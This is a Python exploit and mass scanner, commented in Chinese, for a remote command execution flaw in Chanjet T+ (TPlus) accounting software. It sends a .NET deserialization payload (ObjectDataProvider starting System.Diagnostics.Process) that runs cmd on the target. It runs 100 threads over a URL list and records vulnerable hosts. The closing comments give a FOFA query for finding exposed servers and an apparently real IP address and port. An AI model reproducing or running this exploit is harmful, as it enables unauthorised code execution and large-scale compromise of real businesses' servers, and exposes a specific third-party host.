import argparse, requests, sys
from multiprocessing.dummy import Pool
requests.packages.urllib3.disable_warnings()
def banner():
    test = """畅捷通TPlus-App_Code.ashx存在远程命令执行"""
    print(test)
def main():
    banner()
    parser = argparse.ArgumentParser(description='畅捷通TPlus-App_Code.ashx存在远程命令执行漏洞')
    parser.add_argument('-u', '--url', dest='url', type=str, help="请输入你要测试的URL")
    parser.add_argument('-f', '--file', dest='file', type=str, help="请输入你要批量测试的文件路径")
    args = parser.parse_args()
    if args.url and not args.file:
        poc(args.url)
    elif args.file and not args.url:
        url_list = []
        with open(args.file, 'r', encoding='utf-8') as fp:
            for url in fp.readlines():
                url_list.append(url.strip())
        mp = Pool(100)
        mp.map(poc, url_list)
        mp.close()
        mp.join()
    else:
        print(f"Usag:\n\t python3 {sys.argv[0]} -h")
def poc(target):
    payload = "/tplus/ajaxpro/Ufida.T.CodeBehind._PriorityLevel,App_Code.ashx?method=GetStoreWarehouseByStor"
    headers = {
    "User-Agent":"Mozilla/4.0(compatible;MSIE8.0;WindowsNT6.1)",
    "Accept-Encoding":"gzip,deflate",
    "Accept":"text/html,image/gif,image/jpeg,*;q=.2,*/*;q=.2",
    "Connection":"close",
    "X-Ajaxpro-Method":"GetStoreWarehouseByStore",
    "Content-Type":"application/x-www-form-urlencoded",
    "Content-Length":"583",
    }
    data = '{"storeID":{"__type":"System.Windows.Data.ObjectDataProvider, PresentationFramework, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35","MethodName":"Start","ObjectInstance":{"__type":"System.Diagnostics.Process, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","StartInfo":{"__type":"System.Diagnostics.ProcessStartInfo, System, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089","FileName":"cmd","Arguments":"/c whoami > test1.txt"}}}}'
    try:
        response = requests.post(url=target + payload, headers=headers,data=data, verify=False, timeout=10)
        if response.status_code == 200 and '{"value":new $T.DTO("Ufida.T.AA.DTO.WarehouseDTO, Ufida.T.AA.DTO, Version=12.3.0.0, Culture=neutral, PublicKeyToken=null",{"DtoClassName":"Ufida.T.AA.DTO.WarehouseDTO","AliName":"WarehouseDTO","Status":0,"ChangedProperty":[]}).UnTypify()}' in response.text:
            print(f"[+]{target}存在远程命令执行漏洞")
            with open('畅捷通App_result.txt', 'a') as f:
                f.write(f"{target}存在远程命令执行漏洞\n")
        else:
            print(f"[-]{target}不存在远程命令执行漏洞")
    except:
        print(f"{target}可能存在远程命令执行漏洞")
if __name__ == '__main__':
    main()
# fofa语句
# app="畅捷通-TPlus"
# http://222.67.185.170:88